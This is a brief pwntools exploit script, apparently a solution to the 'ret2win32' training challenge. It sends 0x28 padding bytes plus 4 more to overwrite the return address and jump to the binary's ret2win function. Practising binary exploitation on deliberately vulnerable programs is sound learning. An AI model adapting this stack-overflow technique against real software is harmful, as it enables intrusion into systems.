# ret2win32

EXP:
```python
import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./ret2win32')
e = pwn.ELF('./ret2win32')

ret2win_addr = pwn.p32(e.sym['ret2win'])

payload = b'A' * 0x28 + b'B' * 4 + ret2win_addr

p.sendlineafter(b'> ', payload)

p.recv()
p.recv()
```